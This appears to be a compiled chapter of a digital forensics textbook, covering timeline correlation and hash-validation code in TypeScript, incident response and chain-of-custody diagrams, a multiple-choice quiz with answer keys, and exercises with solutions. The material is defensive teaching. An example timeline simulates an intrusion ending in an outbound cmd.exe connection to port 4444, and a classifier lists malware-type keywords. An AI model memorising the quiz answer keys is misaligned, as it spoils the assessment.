      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Chain of custody"
        }), " is the evidential chain that ensures data integrity from collection to courtroom → broken chain = inadmissible evidence."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Order of volatility"
        }), " dictates the collection sequence: collect the most fragile evidence (RAM) before anything else."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Disk forensics"
        }), " using MFT analysis, file carving, and tools like Autopsy and Sleuth Kit recovers even deleted evidence from storage media."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Memory forensics"
        }), " with Volatility 3 reveals fileless malware, injected code, network connections, and encryption keys that never touch the disk."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Network forensics"
        }), " with Wireshark and Zeek reconstructs C2 communications, lateral movement, and data exfiltration from packet captures."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Mobile forensics"
        }), " requires specialized approaches for Android and iOS, with increasing challenges from encryption and secure enclaves."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cloud forensics"
        }), " demands API-driven evidence collection in ephemeral environments where traditional physical acquisition is impossible."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["The ", (0,jsx_runtime.jsx)(_components.strong, {
          children: "NIST SP 800-61 IR lifecycle"
        }), " (Preparation → Detection → Containment/Eradication/Recovery → Post-Incident) is the industry-standard framework for incident response."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SIEM, SOAR, and XDR"
        }), " provide complementary capabilities: SIEM for visibility, SOAR for automation, XDR for integrated detection and response."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "YARA rules"
        }), " enable custom malware detection through pattern matching in files and memory."]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Real-world case studies demonstrate that the fundamentals → network segmentation, MFA, and proper logging → are the difference between a contained incident and a catastrophic breach."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "typescript-implementations",
      children: "TypeScript Implementations"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "forensic-timeline-analyzer",
      children: "Forensic Timeline Analyzer"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "/**\n * Forensic Timeline Analyzer\n *\n * Builds a unified timeline from disparate forensic event sources (disk, memory,\n * network, cloud logs) and correlates events by source IP, timestamp clusters,\n * and process ancestry. Essential for reconstructing attack chains in incident\n * response investigations.\n */\n\ninterface ForensicEvent {\n  timestamp: Date;\n  source: string;\n  eventType: string;\n  description: string;\n  severity: string;\n  sourceIp?: string;\n  destinationIp?: string;\n  processId?: number;\n  parentProcessId?: number;\n  processName?: string;\n  userId?: string;\n}\n\ninterface ForensicTimeline {\n  events: ForensicEvent[];\n  sorted: boolean;\n  timeRange: { start: Date; end: Date };\n  eventCount: number;\n}\n\ninterface CorrelatedGroup {\n  correlationType: 'same-ip' | 'time-cluster' | 'process-ancestry' | 'user-activity';\n  events: ForensicEvent[];\n  description: string;\n  confidence: number;\n}\n\nclass TimelineAnalyzer {\n  /** Sorts events chronologically and wraps them in a ForensicTimeline */\n  buildTimeline(events: ForensicEvent[]): ForensicTimeline {\n    const sorted = [...events].sort(\n      (a, b) => a.timestamp.getTime() - b.timestamp.getTime()\n    );\n    return {\n      events: sorted,\n      sorted: true,\n      timeRange: {\n        start: sorted[0]?.timestamp || new Date(),\n        end: sorted[sorted.length - 1]?.timestamp || new Date(),\n      },\n      eventCount: sorted.length,\n    };\n  }\n\n  /** Groups events sharing the same source IP address */\n  correlateBySourceIp(events: ForensicEvent[]): CorrelatedGroup[] {\n    const ipGroups = new Map<string, ForensicEvent[]>();\n    for (const event of events) {\n      if (event.sourceIp) {\n        const key = event.sourceIp;\n        if (!ipGroups.has(key)) ipGroups.set(key, []);\n        ipGroups.get(key)!.push(event);\n      }\n    }\n    const results: CorrelatedGroup[] = [];\n    for (const [ip, ipEvents] of ipGroups) {\n      if (ipEvents.length >= 2) {\n        results.push({\n          correlationType: 'same-ip',\n          events: ipEvents,\n          description: `Activity cluster from source IP ${ip} — ${ipEvents.length} events`,\n          confidence: Math.min(0.65 + ipEvents.length * 0.05, 0.95),\n        });\n      }\n    }\n    return results;\n  }\n\n  /** Identifies bursts of activity within a configurable time window */\n  correlateByTimeClusters(\n    events: ForensicEvent[],\n    windowMs: number = 300_000\n  ): CorrelatedGroup[] {\n    const sorted = [...events].sort(\n      (a, b) => a.timestamp.getTime() - b.timestamp.getTime()\n    );\n    const groups: CorrelatedGroup[] = [];\n    let clusterStart = 0;\n    for (let i = 1; i < sorted.length; i++) {\n      const gap =\n        sorted[i].timestamp.getTime() - sorted[i - 1].timestamp.getTime();\n      if (gap > windowMs) {\n        if (i - clusterStart >= 3) {\n          const cluster = sorted.slice(clusterStart, i);\n          groups.push({\n            correlationType: 'time-cluster',\n            events: cluster,\n            description: `Burst of ${cluster.length} events within ${windowMs / 1000}s window`,\n            confidence: Math.min(0.5 + cluster.length * 0.1, 0.95),\n          });\n        }\n        clusterStart = i;\n      }\n    }\n    return groups;\n  }\n\n  /** Groups child processes under their parent process IDs */\n  correlateByProcessAncestry(events: ForensicEvent[]): CorrelatedGroup[] {\n    const parentMap = new Map<number, ForensicEvent[]>();\n    for (const event of events) {\n      if (event.parentProcessId !== undefined) {\n        if (!parentMap.has(event.parentProcessId)) {\n          parentMap.set(event.parentProcessId, []);\n        }\n        parentMap.get(event.parentProcessId)!.push(event);\n      }\n    }\n    const results: CorrelatedGroup[] = [];\n    for (const [parentPid, children] of parentMap) {\n      if (children.length >= 2) {\n        results.push({\n          correlationType: 'process-ancestry',\n          events: children,\n          description: `Process tree rooted at PID ${parentPid} — ${children.length} child events`,\n          confidence: 0.8,\n        });\n      }\n    }\n    return results;\n  }\n\n  /** Runs all correlation strategies and returns combined results */\n  correlateEvents(events: ForensicEvent[]): CorrelatedGroup[] {\n    return [\n      ...this.correlateBySourceIp(events),\n      ...this.correlateByTimeClusters(events),\n      ...this.correlateByProcessAncestry(events),\n    ];\n  }\n\n  /** Produces a human-readable forensic narrative from the timeline */\n  generateNarrative(timeline: ForensicTimeline): string {\n    const groups = this.correlateEvents(timeline.events);\n    const lines: string[] = [\n      '=== FORENSIC ANALYSIS NARRATIVE ===',\n      `Time Range: ${timeline.timeRange.start.toISOString()} — ${timeline.timeRange.end.toISOString()}`,\n      `Total Events: ${timeline.eventCount}`,\n      `Correlated Groups: ${groups.length}`,\n      '',\n    ];\n    for (const group of groups) {\n      lines.push(\n        `[${group.correlationType}] (confidence: ${(group.confidence * 100).toFixed(0)}%)`\n      );\n      lines.push(`  ${group.description}`);\n      const sorted = [...group.events].sort(\n        (a, b) => a.timestamp.getTime() - b.timestamp.getTime()\n      );\n      for (const event of sorted) {\n        lines.push(\n          `    ${event.timestamp.toISOString()} | ${event.source} | ${event.eventType} | ${event.description}`\n        );\n      }\n      lines.push('');\n    }\n    lines.push('=== END OF NARRATIVE ===');\n    return lines.join('\\n');\n  }\n}\n\n// --- Example usage ---\nconst analyzer = new TimelineAnalyzer();\nconst events: ForensicEvent[] = [\n  {\n    timestamp: new Date('2026-06-15T10:00:00Z'),\n    source: 'WinEventLog:4625',\n    eventType: 'Failed Login',\n    description: 'Failed logon for user admin from 203.0.113.5',\n    severity: 'medium',\n    sourceIp: '203.0.113.5',\n  },\n  {\n    timestamp: new Date('2026-06-15T10:00:03Z'),\n    source: 'WinEventLog:4625',\n    eventType: 'Failed Login',\n    description: 'Failed logon for user root from 203.0.113.5',\n    severity: 'medium',\n    sourceIp: '203.0.113.5',\n  },\n  {\n    timestamp: new Date('2026-06-15T10:00:06Z'),\n    source: 'WinEventLog:4624',\n    eventType: 'Successful Login',\n    description: 'Successful logon for user jdoe from 203.0.113.5',\n    severity: 'high',\n    sourceIp: '203.0.113.5',\n    processId: 1001,\n    parentProcessId: 500,\n    processName: 'winlogon.exe',\n  },\n  {\n    timestamp: new Date('2026-06-15T10:01:00Z'),\n    source: 'Sysmon:1',\n    eventType: 'Process Create',\n    description: 'cmd.exe launched by winlogon.exe',\n    severity: 'high',\n    processId: 2001,\n    parentProcessId: 1001,\n    processName: 'cmd.exe',\n    sourceIp: '203.0.113.5',\n  },\n  {\n    timestamp: new Date('2026-06-15T10:01:30Z'),\n    source: 'Sysmon:3',\n    eventType: 'Network Connection',\n    description: 'Outbound connection to 198.51.100.99:4444',\n    severity: 'critical',\n    processId: 2001,\n    parentProcessId: 1001,\n    processName: 'cmd.exe',\n    sourceIp: '203.0.113.5',\n    destinationIp: '198.51.100.99',\n  },\n];\n\nconst timeline = analyzer.buildTimeline(events);\nconsole.log(analyzer.generateNarrative(timeline));\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "hash-set-validator",
      children: "Hash Set Validator"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "/**\n * Hash Set Validator\n *\n * Validates file integrity using SHA-256 and MD5 hashes against known-good\n * baselines and threat intelligence feeds. Supports forensic integrity\n * verification, malware detection through hash matching, and chain-of-custody\n * documentation.\n */\n\ninterface FileRecord {\n  path: string;\n  sha256: string;\n  md5: string;\n  size: number;\n  lastModified?: Date;\n  fileType?: string;\n}\n\ninterface ValidationResult {\n  modified: FileRecord[];\n  new: FileRecord[];\n  deleted: FileRecord[];\n}\n\ninterface ThreatMatch {\n  file: FileRecord;\n  threatName: string;\n  source: string;\n  severity: string;\n}\n\nclass HashValidator {\n  /**\n   * Compares current file set against a known-good baseline to identify\n   * modified, new, and deleted files — essential for forensic integrity\n   * checking during incident response.\n   */\n  validateAgainstKnownGood(\n    files: FileRecord[],\n    knownGood: Map<string, FileRecord>\n  ): ValidationResult {\n    const result: ValidationResult = { modified: [], new: [], deleted: [] };\n    const currentPaths = new Set(files.map((f) => f.path));\n\n    for (const file of files) {\n      const baseline = knownGood.get(file.path);\n      if (baseline) {\n        if (file.sha256 !== baseline.sha256 || file.md5 !== baseline.md5) {\n          result.modified.push(file);\n        }\n      } else {\n        result.new.push(file);\n      }\n    }\n\n    for (const [path, record] of knownGood) {\n      if (!currentPaths.has(path)) {\n        result.deleted.push(record);\n      }\n    }\n\n    return result;\n  }\n\n  /**\n   * Checks file hashes against known threat intelligence feeds to identify\n   * potentially malicious files (malware, ransomware, rootkits, etc.).\n   */\n  validateAgainstThreatIntel(\n    files: FileRecord[],\n    threatIntel: Map<string, string>\n  ): ThreatMatch[] {\n    const matches: ThreatMatch[] = [];\n    for (const file of files) {\n      const sha256Threat = threatIntel.get(file.sha256);\n      const md5Threat = threatIntel.get(file.md5);\n      const threatName = sha256Threat || md5Threat;\n\n      if (threatName) {\n        matches.push({\n          file,\n          threatName,\n          source: sha256Threat ? 'SHA-256' : 'MD5',\n          severity: this.classifyThreatSeverity(threatName),\n        });\n      }\n    }\n    return matches;\n  }\n\n  /**\n   * Generates a comprehensive forensic hash report suitable for\n   * chain-of-custody documentation and court admissibility.\n   */\n  generateHashReport(\n    files: FileRecord[],\n    validationResult?: ValidationResult,\n    threatMatches?: ThreatMatch[]\n  ): string {\n    const lines: string[] = [];\n    lines.push('='.repeat(80));\n    lines.push('FORENSIC HASH VALIDATION REPORT');\n    lines.push('='.repeat(80));\n    lines.push(`Generated: ${new Date().toISOString()}`);\n    lines.push(`Files Analyzed: ${files.length}`);\n    lines.push('');\n\n    lines.push('--- File Inventory ---');\n    for (const file of files.sort((a, b) => a.path.localeCompare(b.path))) {\n      lines.push(`Path:     ${file.path}`);\n      lines.push(`SHA-256:  ${file.sha256}`);\n      lines.push(`MD5:      ${file.md5}`);\n      lines.push(`Size:     ${file.size} bytes`);\n      if (file.fileType) lines.push(`Type:     ${file.fileType}`);\n      lines.push('');\n    }\n\n    if (validationResult) {\n      lines.push('--- Integrity Validation ---');\n      lines.push(`Modified: ${validationResult.modified.length}`);\n      for (const f of validationResult.modified) {\n        lines.push(`  [MODIFIED] ${f.path}`);\n      }\n      lines.push(`New Files: ${validationResult.new.length}`);\n      for (const f of validationResult.new) {\n        lines.push(`  [NEW] ${f.path}`);\n      }\n      lines.push(`Deleted:   ${validationResult.deleted.length}`);\n      for (const f of validationResult.deleted) {\n        lines.push(`  [DELETED] ${f.path}`);\n      }\n      lines.push('');\n    }\n\n    if (threatMatches && threatMatches.length > 0) {\n      lines.push('--- Threat Intelligence Matches ---');\n      for (const match of threatMatches) {\n        lines.push(`  [${match.severity}] ${match.file.path}`);\n        lines.push(`    Threat: ${match.threatName}`);\n        lines.push(`    Match:  ${match.source}`);\n      }\n      lines.push('');\n    }\n\n    lines.push('--- End of Report ---');\n    return lines.join('\\n');\n  }\n\n  private classifyThreatSeverity(threatName: string): string {\n    const critical = ['ransomware', 'rootkit', 'trojan', 'worm', 'loader'];\n    const high = ['spyware', 'backdoor', 'keylogger', 'downloader', 'dropper'];\n    const lower = threatName.toLowerCase();\n    if (critical.some((t) => lower.includes(t))) return 'CRITICAL';\n    if (high.some((t) => lower.includes(t))) return 'HIGH';\n    return 'MEDIUM';\n  }\n}\n\n// --- Example usage ---\nconst validator = new HashValidator();\n\n// Build a known-good baseline\nconst knownGood = new Map<string, FileRecord>();\nknownGood.set('/bin/ls', {\n  path: '/bin/ls',\n  sha256: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b',\n  md5: '11111111111111111111111111111111',\n  size: 142000,\n});\nknownGood.set('/bin/bash', {\n  path: '/bin/bash',\n  sha256: 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c',\n  md5: '22222222222222222222222222222222',\n  size: 1210000,\n});\n\n// Current files on the system (simulating post-incident snapshot)\nconst currentFiles: FileRecord[] = [\n  {\n    path: '/bin/ls',\n    sha256: 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',\n    md5: '33333333333333333333333333333333',\n    size: 142000,\n    lastModified: new Date('2026-06-15T03:00:00Z'),\n    fileType: 'ELF executable',\n  },\n  {\n    path: '/bin/bash',\n    sha256: 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c',\n    md5: '22222222222222222222222222222222',\n    size: 1210000,\n    lastModified: new Date('2026-01-01T00:00:00Z'),\n    fileType: 'ELF executable',\n  },\n  {\n    path: '/tmp/.malware',\n    sha256: 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',\n    md5: '44444444444444444444444444444444',\n    size: 65536,\n    lastModified: new Date('2026-06-15T03:05:00Z'),\n    fileType: 'ELF executable',\n  },\n];\n\n// Threat intelligence feed\nconst threatIntel = new Map<string, string>();\nthreatIntel.set(\n  'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',\n  'Trojan.Generic.2026'\n);\n\n// Run validation\nconst integrityResult = validator.validateAgainstKnownGood(currentFiles, knownGood);\nconsole.log('Integrity Check:');\nconsole.log(`  Modified: ${integrityResult.modified.length} file(s)`);\nconsole.log(`  New:      ${integrityResult.new.length} file(s)`);\nconsole.log(`  Deleted:  ${integrityResult.deleted.length} file(s)`);\n\nconst threatMatches = validator.validateAgainstThreatIntel(currentFiles, threatIntel);\nconsole.log(`\\nThreat Intel Matches: ${threatMatches.length}`);\nthreatMatches.forEach((m) =>\n  console.log(`  [${m.severity}] ${m.file.path} — ${m.threatName}`)\n);\n\n// Generate full report for chain of custody\nconsole.log(\n  '\\n' + validator.generateHashReport(currentFiles, integrityResult, threatMatches)\n);\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "mermaid-diagrams",
      children: "Mermaid Diagrams"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "incident-response-lifecycle-nist-sp-800-61",
      children: "Incident Response Lifecycle (NIST SP 800-61)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart TD\n    Prep[\"1. Preparation<br/><i>• IR plan & team<br/>• Tools & playbooks<br/>• Training & drills</i>\"] --> Det[\"2. Detection & Analysis<br/><i>• SIEM alerts<br/>• Threat intel<br/>• User reports</i>\"]\n    Det --> Cont[\"3. Containment<br/><i>• Short-term: isolate host<br/>• Long-term: patch & segment</i>\"]\n    Cont --> Erad[\"4. Eradication<br/><i>• Remove malware<br/>• Patch vulns<br/>• Rotate creds</i>\"]\n    Erad --> Rec[\"5. Recovery<br/><i>• Restore from backup<br/>• Monitor for recurrence<br/>• Return to prod</i>\"]\n    Rec --> LL[\"6. Lessons Learned<br/><i>• Post-mortem<br/>• Update playbooks<br/>• Improve controls</i>\"]\n    LL -.->|\"Feedback loop\"| Prep\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "chain-of-custody-workflow",
      children: "Chain of Custody Workflow"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart TD\n    Collect[\"1. Evidence Collection<br/><i>• Photograph scene<br/>• Use write-blocker<br/>• Hash all media</i>\"] -->|\"Hash verified + signed\"| Seal[\"2. Sealing & Labeling<br/><i>• Tamper-evident bag<br/>• Case ID & barcode<br/>• Collector signature</i>\"]\n    Seal -->|\"Chain of Custody Form\"| Transport[\"3. Transportation<br/><i>• Secure courier<br/>• GPS tracking<br/>• Temp/env monitoring</i>\"]\n    Transport -->|\"Signed receipt\"| Store[\"4. Secure Storage<br/><i>• Evidence locker<br/>• Access log<br/>• Climate control</i>\"]\n    Store -->|\"Check-out/in log\"| Analysis[\"5. Forensic Analysis<br/><i>• Forensic workstation<br/>• Bit-for-bit copy<br/>• Analysis on copy</i>\"]\n    Analysis -->|\"Expert report + exhibits\"| Court[\"6. Court Presentation<br/><i>• Expert testimony<br/>• Evidence admissibility<br/>• Daubert/Frye standard</i>\"]\n    \n    subgraph Signatures[\"Chain of Custody Signatures\"]\n        S1[\"1. Collector<br/>(name, date, time)\"]\n        S2[\"2. Custodian<br/>(receipt confirmation)\"]\n        S3[\"3. Analyst<br/>(access authorization)\"]\n        S4[\"4. Reviewer<br/>(QA oversight)\"]\n    end\n    \n    Seal -.-> S1\n    Transport -.-> S2\n    Store -.-> S3\n    Analysis -.-> S4\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "chapter-quiz",
      children: "Chapter Quiz"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "#"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Question"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "A"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "B"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "C"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "D"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Answer"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What is the FIRST step in the digital forensics methodology?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Collection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Identification"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Presentation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Chain of custody documentation is critical because:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "It tracks hardware inventory"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Without it, evidence may be ruled inadmissible in court"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "It helps identify malware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "It is required for SIEM integration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which of the following follows the correct Order of Volatility?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hard drive → RAM → Network connections → CPU registers"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CPU registers → RAM → Network connections → Hard drive"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "RAM → Hard drive → Network connections → CPU registers"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CPU registers → Network connections → RAM → Hard drive"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What does MFT stand for in disk forensics?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Master File Table"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Main Forensic Tool"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Metadata File Tracker"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Memory Fault Table"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "A"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which tool is the industry standard for memory forensics?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Wireshark"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Volatility"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Autopsy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Zeek"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which phase of the NIST SP 800-61 IR lifecycle involves removing malware and patching vulnerabilities?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Containment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Eradication"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Recovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "C"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What is the primary purpose of file carving in disk forensics?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "To encrypt forensic images"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "To recover deleted files based on file signatures"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "To compress evidence storage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "To create hash values"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "In mobile forensics, what is the biggest challenge for iOS data acquisition?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SELinux policies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Encryption and Secure Enclave"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SD card encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android fragmentation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which of the following is NOT one of the six phases of the digital forensics methodology?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Identification"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Preservation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prosecution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Collection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "C"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "YARA rules are primarily used for:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network packet capture"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pattern-based malware detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disk encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User authentication"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "exercises",
      children: "Exercises"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "review-questions",
      children: "Review Questions"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What are the six phases of the digital forensics methodology?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n1) Identification (detect an incident). 2) Preservation (isolate, create forensic images). 3) Collection (acquire data following order of volatility). 4) Examination (forensic analysis of acquired data). 5) Analysis (correlate findings, draw conclusions). 6) Reporting (document methodology, findings, and conclusions for stakeholders/court).\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Explain the Order of Volatility and why it matters for incident response."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nOrder of Volatility prioritizes collecting evidence from most volatile to least: CPU registers/cache → RAM → network connections → running processes → temporary files → disk → backups/archives. Critical because volatile data (RAM, network state) is lost on power-off. Collect most volatile first to preserve evidence that would otherwise be lost when the system is shut down.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What is the difference between live acquisition and dead acquisition?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nLive acquisition: collecting evidence from a running system (RAM, network connections, running processes). Preserves volatile data but the acquisition tool itself modifies system state slightly. Dead acquisition: collecting evidence from a powered-off system (disk imaging, cold boot). More forensically sound (no state changes by tools) but loses volatile data. Live first, then dead.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "4",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "List three types of evidence that can be recovered from a Windows registry hive."
      }), "\n"]
